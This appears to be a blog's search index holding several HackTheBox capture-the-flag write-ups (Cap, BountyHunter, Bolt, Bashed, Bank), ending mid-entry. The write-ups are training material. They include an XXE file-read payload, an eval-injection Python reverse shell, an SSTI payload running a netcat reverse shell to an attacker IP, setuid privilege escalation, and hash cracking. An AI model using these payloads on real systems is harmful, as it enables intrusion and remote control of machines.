writeup", "url": "/posts/Cap/", "categories": "Writeup, HackTheBox", "tags": "Easy-box", "date": "2022-06-21 15:00:00 +0200", "snippet": "SummaryThis was a pretty easy box. An IDOR in the webapplication gives a pcap file which includes SSH credentials. Once logged in running linpeas reveals that python has setuid capabilities, allowing us to root the box.FootholdWe will start out by doing a port scan with nmap: Nmap 7.92 scan initiated Sun Jun 12 01:35:44 2022 as: nmap -sC -sV -o nmap/ini.txt 10.129.72.55Nmap scan report for 10.129.72.55Host is up (0.074s latency).Not shown: 997 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.322/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)| 256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)|_ 256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)80/tcp open http gunicorn...The box has 3 ports open. 21/tcp which is hosting a ftp service, 22/tcp which is hosting an ssh service and 80/tcp which is hosting a http service.When visiting the web application hosted on port 80 we get greeted with the following:One of the tabs is titled “Security Snapshot (5 Second PCAP + Analysis)”. Entering this tab we see that our URL is http://10.129.85.29/data/1. Changing the 1 to a 0 gives us access to another .pcap file with a bit more information via an IDOR vulnerability.Analyzing this file with Wireshark gives us some credentials:Using the credentials nathan:Buck3tH4TF0RM3! we can login as nathan via ssh.Privilege escalationOnce logged in we run linpeas, which gives us some interesting output:Files with capabilities (limited to 50):/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip/usr/bin/ping = cap_net_raw+ep/usr/bin/traceroute6.iputils = cap_net_raw+ep/usr/bin/mtr-packet = cap_net_raw+ep/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+epWe got some different files with capabilities. The most interesting is python3.8 which allows us to use the os.setuid function. this allows us to perform functions as root through python.nathan@cap:~$ python3.8Python 3.8.5 (default, Jan 27 2021, 15:41:15) [GCC 9.3.0] on linuxType &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.&amp;gt;&amp;gt;&amp;gt; import os&amp;gt;&amp;gt;&amp;gt; os.setuid(0)&amp;gt;&amp;gt;&amp;gt; os.system(&#39;/bin/bash&#39;)root@cap:~# Rooted!" }, { "title": "Bountyhunter writeup", "url": "/posts/BountyHunter/", "categories": "Writeup, HackTheBox", "tags": "Easy-box, xxe", "date": "2022-06-21 14:00:00 +0200", "snippet": "SummaryThis box includes XXE which gives us access to read local files. When reading these files we get access to credentials that can be used as SSH login. A python script is then available on the box which can be run as root and when exploited it gives a reverse shell.FootholdWe start out by doing a port scan with nmap:nmap -sC -sV 10.129.95.166 Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-21 15:18 CESTNmap scan report for 10.129.95.166Host is up (0.027s latency).Not shown: 998 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)| 256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)|_ 256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-title: Bounty Hunters|_http-server-header: Apache/2.4.41 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 8.77 secondsAs can be seen via the scan, two ports are open namely port 22 and 80, which host an ssh and http service repsectively. Visiting the web application on port 80 we get greeted with this:Before we go any further we scan the application with gobuster:gobuster dir -u http://10.129.95.166/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://10.129.95.166/[+] Method: GET[+] Threads: 10[+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.1.0[+] Extensions: php[+] Timeout: 10s===============================================================2022/06/21 15:19:15 Starting gobuster in directory enumeration mode===============================================================/index.php (Status: 200) [Size: 25169]/resources (Status: 301) [Size: 318] [--&amp;gt; http://10.129.95.166/resources/]/assets (Status: 301) [Size: 315] [--&amp;gt; http://10.129.95.166/assets/] /portal.php (Status: 200) [Size: 125] /css (Status: 301) [Size: 312] [--&amp;gt; http://10.129.95.166/css/] /db.php (Status: 200) [Size: 0] /js (Status: 301) [Size: 311] [--&amp;gt; http://10.129.95.166/js/] Progress: 36248 / 175330 (20.67%) ^C[!] Keyboard interrupt detected, terminating. ===============================================================2022/06/21 15:22:41 Finished===============================================================If we try to visit portal.php, we quickly get sent to log_submit.php.We can then try to submit a report on the page. I started Burpsuite and setup the proxy and found that it sends the contents of the form as a base64 encoded and then url encoded XML form. See below:Since we are sending an XML form it might be vulnerable to an XXE (XML External Entity) attack.I used the payload below payload to read the /etc/passwd file. Remember to base64 and url encode it before sending it. &amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&amp;gt;&amp;lt;!DOCTYPE foo [&amp;lt;!ENTITY file SYSTEM &quot;php://filter/convert.base64-encode/resource=/etc/passwd&quot;&amp;gt; ]&amp;gt; &amp;lt;bugreport&amp;gt; &amp;lt;title&amp;gt;test&amp;lt;/title&amp;gt; &amp;lt;cwe&amp;gt;test&amp;lt;/cwe&amp;gt; &amp;lt;cvss&amp;gt;test&amp;lt;/cvss&amp;gt; &amp;lt;reward&amp;gt;&amp;amp;file;&amp;lt;/reward&amp;gt; &amp;lt;/bugreport&amp;gt;I then used this to load the contents of the /var/www/html/db.php file, which includes credentials:The base64 decoded contents of both files can be found below:root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologinsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologinsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologinsystemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologinmessagebus:x:103:106::/nonexistent:/usr/sbin/nologinsyslog:x:104:110::/home/syslog:/usr/sbin/nologin_apt:x:105:65534::/nonexistent:/usr/sbin/nologintss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/falseuuidd:x:107:112::/run/uuidd:/usr/sbin/nologintcpdump:x:108:113::/nonexistent:/usr/sbin/nologinlandscape:x:109:115::/var/lib/landscape:/usr/sbin/nologinpollinate:x:110:1::/var/cache/pollinate:/bin/falsesshd:x:111:65534::/run/sshd:/usr/sbin/nologinsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologindevelopment:x:1000:1000:Development:/home/development:/bin/bashlxd:x:998:100::/var/snap/lxd/common/lxd:/bin/falseusbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin&amp;lt;?php// TODO -&amp;gt; Implement login system with the database.$dbserver = &quot;localhost&quot;;$dbname = &quot;bounty&quot;;$dbusername = &quot;admin&quot;;$dbpassword = &quot;m19RoAU0hP41A1sTsq6K&quot;;$testuser = &quot;test&quot;;?&amp;gt;We can then login as the development user with the password found in the php file.Privilege escalationOnce logged in we run sudo -l:development@bountyhunter:~$ sudo -lMatching Defaults entries for development on bountyhunter: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser development may run the following commands on bountyhunter: (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.pyIt seems that we have rights to run a python script as root. The contents of the script can be found below:#Skytrain Inc Ticket Validation System 0.1#Do not distribute this file.def load_file(loc): if loc.endswith(&quot;.md&quot;): return open(loc, &#39;r&#39;) else: print(&quot;Wrong file type.&quot;) exit()def evaluate(ticketFile): #Evaluates a ticket to check for ireggularities. code_line = None for i,x in enumerate(ticketFile.readlines()): if i == 0: if not x.startswith(&quot;# Skytrain Inc&quot;): return False continue if i == 1: if not x.startswith(&quot;## Ticket to &quot;): return False print(f&quot;Destination: {&#39; &#39;.join(x.strip().split(&#39; &#39;)[3:])}&quot;) continue if x.startswith(&quot;__Ticket Code:__&quot;): code_line = i+1 continue if code_line and i == code_line: if not x.startswith(&quot;**&quot;): return False ticketCode = x.replace(&quot;**&quot;, &quot;&quot;).split(&quot;+&quot;)[0] if int(ticketCode) % 7 == 4: validationNumber = eval(x.replace(&quot;**&quot;, &quot;&quot;)) if validationNumber &amp;gt; 100: return True else: return False return Falsedef main(): fileName = input(&quot;Please enter the path to the ticket file.\\n&quot;) ticket = load_file(fileName) #DEBUG print(ticket) result = evaluate(ticket) if (result): print(&quot;Valid ticket.&quot;) else: print(&quot;Invalid ticket.&quot;) ticket.closemain()The interesting function in this script is the evaluate(ticketFile) function. If given a correctly formed .md file, it will evaluate the ticket code, which it expects to be an arithmetic expression. If we instead insert python code into the ticket code, then this code will also be evaluated and therefore run. Because of this we can insert a python reverse shell in the file and then get root access. I used the script on the below file:# Skytrain Inc## Ticket to Rome__Ticket Code:__**102+10==112 and exec(&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.17.182&quot;,1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;)When the script is run we get a reverse shell.┌──(bitis㉿workstation)-[~/htb/Machines/BountyHunter]└─$ nc -lvnp 1234 1 ⨯listening on [any] 1234 ...connect to [10.10.17.182] from (UNKNOWN) [10.129.95.166] 59012# lsinvalid_ticketsticketValidator.py# cd /root# cat root.txt5cefca1942fd5e713a3443d779f24733# Rooted!" }, { "title": "Bolt writeup", "url": "/posts/Bolt/", "categories": "Writeup, HackTheBox", "tags": "medium-box, docker, pgp", "date": "2022-06-17 20:00:00 +0200", "snippet": "SummaryBolt is a box which is mainly centered around forensics and enumeration, especially when it comes to Docker. However techniques such as source code analysis and SSTI exploitation is also present in this box.FootholdLet’s start out with a nmap scan:# Nmap 7.92 scan initiated Wed Jan 19 11:49:56 2022 as: nmap -sC -sV -p- -o nmap/full.txt 10.129.165.25Nmap scan report for 10.129.165.25Host is up (0.049s latency).Not shown: 65532 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 4d:20:8a:b2:c2:8c:f5:3e:be:d2:e8:18:16:28:6e:8e (RSA)| 256 7b:0e:c7:5f:5a:4c:7a:11:7f:dd:58:5a:17:2f:cd:ea (ECDSA)|_ 256 a7:22:4e:45:19:8e:7d:3c:bc:df:6e:1d:6c:4f:41:56 (ED25519)80/tcp open http nginx 1.18.0 (Ubuntu)|_http-title: Starter Website - About |_http-server-header: nginx/1.18.0 (Ubuntu)443/tcp open ssl/http nginx 1.18.0 (Ubuntu)| http-title: Passbolt | Open source password manager for teams|_Requested resource was /auth/login?redirect=%2F| ssl-cert: Subject: commonName=passbolt.bolt.htb/organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=AU| Not valid before: 2021-02-24T19:11:23|_Not valid after: 2022-02-24T19:11:23|_ssl-date: TLS randomness does not represent time|_http-server-header: nginx/1.18.0 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Wed Jan 19 11:52:53 2022 -- 1 IP address (1 host up) scanned in 176.70 secondsBased on the output we know that the box is hosting a webpage with the domain name passbolt.bolt.htb. We can add both this domain and also bolt.htb to our /etc/hosts file.Since the machine uses subdomains, it might be interesting to see if we can find others.$ gobuster vhost -u bolt.htb -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt 2 ⨯===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://bolt.htb[+] Method: GET[+] Threads: 10[+] Wordlist: /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt[+] User Agent: gobuster/3.1.0[+] Timeout: 10s===============================================================2022/06/17 21:20:32 Starting gobuster in VHOST enumeration mode===============================================================Found: mail.bolt.htb (Status: 200) [Size: 4943]Found: demo.bolt.htb (Status: 302) [Size: 219] ===============================================================2022/06/17 21:21:47 Finished===============================================================Let’s add these to our host file as well.We start by taking a look at the webpage hosted with the passbolt.bolt.htb domain:Before we can continue here we need a valid email from the bolt organization presumably. Since this is the case let’s move on to the application hosted on port 80:The page contains a download tab where we can download a docker image from the organization. Other than that there is nothing else that is eye catching. The other simply display a login screen:Let’s take a look at the downloaded docker image. I used Dive for this:dive docker-archive://image.tarWe need to remember to specify that we are analyzing a docker archive, otherwise the tool will try to pull the image, which in this case it will not be able to.While using Dive, we can use tab to switch between the tab controlling the layers we are analyzing and the tab containing the files in that layer. While the file tab is in use we can pres ctrl+U to only show modified files. If we take a look at the layer with the id a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2 we can see that a sqlite3 database was added. Let’s unzip the image and take a further look at that layer.Once the image has been untarred and the layer also untarred, we can access the sqlite3 database:$ sqlite3 db.sqlite3 SQLite version 3.38.5 2022-05-06 15:25:27Enter &quot;.help&quot; for usage hints.sqlite&amp;gt; .tablesUsersqlite&amp;gt; select * from User;1|admin|admin@bolt.htb|$1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.||sqlite&amp;gt; We now have the hash for the admin user! The question is just for which service exactly. Before we start thinking about that let’s crack the hash:$ hashid hash2.txt --File &#39;hash2.txt&#39;--Analyzing &#39;$1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.&#39;[+] MD5 Crypt [+] Cisco-IOS(MD5) [+] FreeBSD MD5 --End of file &#39;hash2.txt&#39;-- the hash was identified as MD5 Crypt. Below is the relevant output from hashcat:$ hashcat -a 0 -m 500 hash2.txt /usr/share/wordlists/rockyou.txtHost memory required for this attack: 2 MBDictionary cache hit:* Filename..: /usr/share/wordlists/rockyou.txt* Passwords.: 14344385* Bytes.....: 139921507* Keyspace..: 14344385$1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.:deadboltThe password lets us login to the bolt.htb site, and we are greeted with the admin panel:The admin panel also contains a conversation between the admin and a user named Sarah:Hi Sarah, did you have time to check over the docker image? If not I&#39;ll get Eddie to take a look over. Our security team had a concern with it - something about e-mail? I have been so busy with the design I didn&#39;t have time yet, I think Eddie&#39;s help is required! Our demo is currently restricted to invite only. Ok, I will get Eddie to take a look over. I just want to be sure that the Docker image is safe to use. Not a problem, thanks for lending a hand! Make sure the image is scrubbed before hosting it! So to get access to the demo subdomain we need an invite. Let’s take a look at the different layers in the Docker again.As we can see in the image, the layer with id 41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad is the layer where the base application was first added, where files such as routes.py and forms.py were later removed in future layers.Let’s take a look at these files and see if we can find anything interesting. Luckily for us, the layer contains the code for both the demo and mail application! Below are relevant snippets.@blueprint.route(&#39;/register&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])def register(): login_form = LoginForm(request.form) create_account_form = CreateAccountForm(request.form) if &#39;register&#39; in request.form: username = request.form[&#39;username&#39;] email = request.form[&#39;email&#39; ] code = request.form[&#39;invite_code&#39;] if code != &#39;XNSS-HSJW-3NGU-8XTJ&#39;: return render_template(&#39;code-500.html&#39;) data = User.query.filter_by(email=email).first() if data is None and code == &#39;XNSS-HSJW-3NGU-8XTJ&#39;: # Check usename exists user = User.query.filter_by(username=username).first() if user: return render_template( &#39;accounts/register.html&#39;, msg=&#39;Username already registered&#39;, success=False, form=create_account_form) # Check email exists user = User.query.filter_by(email=email).first() if user: return render_template( &#39;accounts/register.html&#39;, msg=&#39;Email already registered&#39;, success=False, form=create_account_form) # else we can create the user user = User(**request.form) db.session.add(user) db.session.commit() return render_template( &#39;accounts/register.html&#39;, msg=&#39;User created please &amp;lt;a href=&quot;/login&quot;&amp;gt;login&amp;lt;/a&amp;gt;&#39;, success=True, form=create_account_form) else: return render_template( &#39;accounts/register.html&#39;, form=create_account_form)This snippet contains the code needed to register an account on the demo application. When we register our account we might notice that we can use the same account on the mail application, so let’s take a look a snippet from that application as well.@blueprint.route(&#39;/confirm/changes/&amp;lt;token&amp;gt;&#39;)def confirm_changes(token): &quot;&quot;&quot;Confirmation Token&quot;&quot;&quot; try: email = ts.loads(token, salt=&quot;changes-confirm-key&quot;, max_age=86400) except: abort(404) user = User.query.filter_by(username=email).first_or_404() name = user.profile_update template = open(&#39;templates/emails/update-name.html&#39;, &#39;r&#39;).read() msg = Message( recipients=[f&#39;{user.email}&#39;], sender = &#39;support@example.com&#39;, reply_to = &#39;support@example.com&#39;, subject = &quot;Your profile changes have been confirmed.&quot; ) msg.html = render_template_string(template % name) mail.send(msg) return render_template(&#39;index.html&#39;)As can be seen in the snippet above, the application takes the updated name and inserts it into the the template without any checks. This is SSTI and worst case scenario it leads to code execution on the system hosting the application. More details can be found here and here.If we change our name on the demo application we can see that we have code execution via the mail application.We can use the SSTI to execute code. In our case we’ll use a reverse shell payload.{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen(&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.17.182 1337 &amp;gt;/tmp/f&#39;).read() }}$ nc -lvnp 1337listening on [any] 1337 ...connect to [10.10.17.182] from (UNKNOWN) [10.129.86.187] 51288/bin/sh: 0: can&#39;t access tty; job control turned off$ iduid=33(www-data) gid=33(www-data) groups=33(www-data)$ PivotNow that we have a shell on the system we should try to leverage that into getting access to a user account. In this case i simply ran linpeas:╔══════════╣ Analyzing Passbolt Files (limit 70)-rw-r----- 1 root www-data 3128 Feb 25 2021 /etc/passbolt/passbolt.php * Passbolt ~ Open source password manager for teams &#39;host&#39; =&amp;gt; &#39;localhost&#39;, &#39;port&#39; =&amp;gt; &#39;3306&#39;, &#39;username&#39; =&amp;gt; &#39;passbolt&#39;, &#39;password&#39; =&amp;gt; &#39;rT2;jW7&amp;lt;eY8!dX8}pQ8%&#39;, &#39;database&#39; =&amp;gt; &#39;passboltdb&#39;,Reading the passwd file gives us the username clark and eddie. Trying to log in via ssh as eddie with the password found above works, and we have successfully pivoted to the eddie user.Privilege escalationRunning linpeas once more we get the following interesting output:══╣ Possible private SSH keys were found!/etc/ImageMagick-6/mime.xml/home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/index.min.js/home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js/home/eddie/.config/google-chrome/Default/Local Extension Settings/didegimhafipceonhjepacocaffmoppf/000003.logIf we read 000003.log we quickly stumble across a private PGP key. Copying the key to a text file on our local machine we can use pgp2john to extract the hash from the key.$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt Using default input encoding: UTF-8Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])Cost 1 (s2k-count) is 16777216 for all loaded hashesCost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 8 for all loaded hashesCost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashesWill run 8 OpenMP threadsPress &#39;q&#39; or Ctrl-C to abort, almost any other key for status0g 0:00:02:29 0.05% (ETA: 2022-06-21 08:22) 0g/s 60.79p/s 60.79c/s 60.79C/s patch..maranathamerrychristmas (Eddie Johnson) 1g 0:00:12:09 DONE (2022-06-18 01:07) 0.001370g/s 58.71p/s 58.71c/s 58.71C/s mhines..megan5Use the &quot;--show&quot; option to display all of the cracked passwords reliablySession completed. We can use the credentials found previously to access the mysql database on the system with the passbolt user via the command mysql -u passbolt -p.mysql&amp;gt; show databases;+--------------------+| Database |+--------------------+| information_schema || passboltdb |+--------------------+2 rows in set (0.01 sec)mysql&amp;gt; use passboltdb;Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedmysql&amp;gt; show tables;+-----------------------+| Tables_in_passboltdb |+-----------------------+| account_settings || action_logs || actions || authentication_tokens || avatars || comments || email_queue || entities_history || favorites || gpgkeys || groups || groups_users || organization_settings || permissions || permissions_history || phinxlog || profiles || resource_types || resources || roles || secret_accesses || secrets || secrets_history || user_agents || users |+-----------------------+25 rows in set (0.00 sec)mysql&amp;gt; select * from secrets;---SNIP--------BEGIN PGP MESSAGE-----Version: OpenPGP.js v4.10.9Comment: https://openpgpjs.orgwcBMA/ZcqHmj13/kAQgAkS/2GvYLxglAIQpzFCydAPOj6QwdVV5BR17W5pscg/ajGlQbkE6wgmpoV7HuyABUjgrNYwZGN7ak2Pkb+/3LZgtpV/PJCAD030kYpCLSEEzPBiIGQ9VauHpATf8YZnwK1JwO/BQnpJUJV71YOon6PNV71T2zFr3HoAFbR/wPyF6Lpkwy56u3A2A6lbDb3sRl/SVIj6xtXn+fICeHjvYEm2IrE4Pxl+DjN5Nf4aqxEheWzmJwcyYqTsZLMtw+rnBlLYOaGRaa8nWmcUlMrLYD218RzyL8zZw0AEo6aOToteDPchiIMqjuExsqjG71CO1ohIIlnlK602+x7/8b7nQpedLA7wF8tR9g8Tpy+ToQOozGKBy/auqOHO66vA1EKJkYSZzMXxnp45XA38+ul0/OwtBNuNHreOIH090dHXx69IsyrYXt9dAbFhvbWr6eP/MIgh5I0RkYwGCtoPeQehKMPkCzyQl6Ren4iKS+F+L207kwqZ+jP8uEn3nauCmm64pcvy/RZJp7FUlT7Sc0hmZRIRQJ2U9vK2V63Yre0hfAj0f8F50cRR+v+BMLFNJVQ6Ck3Nov8fG5otsEteRjkc58itOGQ38EsnH3sJ3WuDw8ifeR/+K72r39WiBEiE2WHVey5nOF6WEnUOz0j0CKoFzQgri9YyK6CZ3519x3amBTgITmKPfgRsMy2OWU/7tYNdLxO3vh2Eht7tqqpzJwW0CkniTLcfrzP++0cHgAKF2tkTQtLO6QOdpzIH5aIebmi/MVUAw3a9J+qeVvjdtvb2fKCSgEYY4ny992ov5nTKSH9Hi1ny2vrBhsnO9/aqEQ+2tE60QFsa2dbAAn7QKk8VE2B05jBGSLa0H7xQxshwSQYnHaJCE6TQtOIti4o2sKEAFQnf7RDgpWeugbn/vphihSA984=P38i-----END PGP MESSAGE-----This secret message can be decrypted with the PGP key and password we found earlier. Save the message to a text file and use the following commands:┌──(bitis㉿workstation)-[~/htb/Machines/bolt]└─$ gpg --pinentry-mode loopback --passphrase merrychristmas -d secret.pgp gpg: encrypted with RSA key, ID F65CA879A3D77FE4gpg: decryption failed: No secret key ┌──(bitis㉿workstation)-[~/htb/Machines/bolt]└─$ gpg --batch --import pgp.key 2 ⨯gpg: key 1C2741A3DC3B4ABD: public key &quot;Eddie Johnson &amp;lt;eddie@bolt.htb&amp;gt;&quot; importedgpg: key 1C2741A3DC3B4ABD: secret key importedgpg: Total number processed: 1gpg: imported: 1gpg: secret keys read: 1gpg: secret keys imported: 1 ┌──(bitis㉿workstation)-[~/htb/Machines/bolt]└─$ gpg --pinentry-mode loopback --passphrase merrychristmas -d secret.pgpgpg: encrypted with 2048-bit RSA key, ID F65CA879A3D77FE4, created 2021-02-25 &quot;Eddie Johnson &amp;lt;eddie@bolt.htb&amp;gt;&quot;{&quot;password&quot;:&quot;Z(2rmxsNW(Z?3=p/9s&quot;,&quot;description&quot;:&quot;&quot;}gpg: Signature made Sat 06 Mar 2021 04:33:54 PM CETgpg: using RSA key 1C2741A3DC3B4ABDgpg: Good signature from &quot;Eddie Johnson &amp;lt;eddie@bolt.htb&amp;gt;&quot; [unknown]gpg: WARNING: This key is not certified with a trusted signature!gpg: There is no indication that the signature belongs to the owner.Primary key fingerprint: DF42 6BC7 A4A8 AF58 E50E DA0E 1C27 41A3 DC3B 4ABD ┌──(bitis㉿workstation)-[~/htb/Machines/bolt]└─$ The password found in the decrypted message can be used to log in as root on the machine!eddie@bolt:~/.config/google-chrome/Default/Local Extension Settings/didegimhafipceonhjepacocaffmoppf$ su -Password: root@bolt:~# Rooted!" }, { "title": "Bashed writeup", "url": "/posts/Bashed/", "categories": "Writeup, HackTheBox", "tags": "Easy-box", "date": "2022-06-17 15:30:00 +0200", "snippet": "FootholdWhen first visiting the site, we get greeted by this page:It seems that the site is advertising a pentest tool, and they even inform us that it was used on this very server!Performing a directory scan with gobuster, we get the following output:┌──(bitis㉿workstation)-[~/htb/Machines/bashed]└─$ gobuster dir -u http://10.129.73.18 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt ===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://10.129.73.18[+] Method: GET[+] Threads: 10[+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.1.0[+] Timeout: 10s===============================================================2022/06/13 21:11:03 Starting gobuster in directory enumeration mode===============================================================/images (Status: 301) [Size: 313] [--&amp;gt; http://10.129.73.18/images/]/uploads (Status: 301) [Size: 314] [--&amp;gt; http://10.129.73.18/uploads/]/php (Status: 301) [Size: 310] [--&amp;gt; http://10.129.73.18/php/] /css (Status: 301) [Size: 310] [--&amp;gt; http://10.129.73.18/css/] /dev (Status: 301) [Size: 310] [--&amp;gt; http://10.129.73.18/dev/] /js (Status: 301) [Size: 309] [--&amp;gt; http://10.129.73.18/js/] Progress: 2282 / 220561 (1.03%) ^C[!] Keyboard interrupt detected, terminating. ===============================================================2022/06/13 21:11:14 Finished===============================================================Lets start by checking out /dev:It seems like phpbash is already on the server! Let’s figure out how it works:phpbash seems to be a pretty nice webshell. We’ll use it to give ourselves a reverse shell on the system.┌──(bitis㉿workstation)-[~]└─$ nc -lvnp 1337listening on [any] 1337 ...connect to [10.10.17.182] from (UNKNOWN) [10.129.73.18] 45376$ lslsarrexel scriptmanager$ sudo -lsudo -lMatching Defaults entries for www-data on bashed: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser www-data may run the following commands on bashed: (scriptmanager : scriptmanager) NOPASSWD: ALL$ Privilege escalationSince we can run any sudo command as scriptmanager we just switch user like so:$ sudo -u scriptmanager bash -isudo -u scriptmanager bash -iscriptmanager@bashed:/home$ There is a non-standard root-level directory named /scripts. In it we find a file named test.py:criptmanager@bashed:/scripts$ cat test.pycat test.pyf = open(&quot;test.txt&quot;, &quot;w&quot;)f.write(&quot;testing 123!&quot;)f.closescriptmanager@bashed:/scripts$ cat test.txtcat test.txttesting 123!scriptmanager@bashed:/scripts$ ls -alls -altotal 16drwxrwxr-- 2 scriptmanager scriptmanager 4096 Dec 4 2017 .drwxr-xr-x 23 root root 4096 Dec 4 2017 ..-rw-r--r-- 1 scriptmanager scriptmanager 58 Dec 4 2017 test.py-rw-r--r-- 1 root root 12 Jun 13 10:27 test.txtscriptmanager@bashed:/scripts$ As we can see, the file simply opens a file test.txt, writes “testing 123!” in it and then closes that file. Based on the timestamp on that file it seems that it is being run as a cronjob by root. A way to exploit this is to realise that although root is running the cronjob, the cronjob simply involves executing test.py, which we have access to. We can either replace the file with one that gives us a reverse shell or we can just change what is written to the file, for example root.txtRooted!" }, { "title": "Bank writeup", "url": "/posts/Bank/", "categories": "Writeup, HackTheBox", "tags": "Easy-box", "date": "2022-06-17 15:00:00 +0200", "snippet": "SummaryThis was one of the easier boxes on the platform. With comments left in the HTML source code and a SUID binary giving root access immediatly. In any case, you can learn some fuzzing on this box since it is required to find the credentials for the ticket page.FootholdWe start by adding bank.htb to our /etc/hosts file. When visiting the site we get greeted with a login page:You could try to perform some SQL-injection to bypass the login, but it wont work. Instead we fuzz for directories via gobuster:gobuster dir -u http://bank.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php===============================================================Gobuster v3.1.0by OJ Reeves 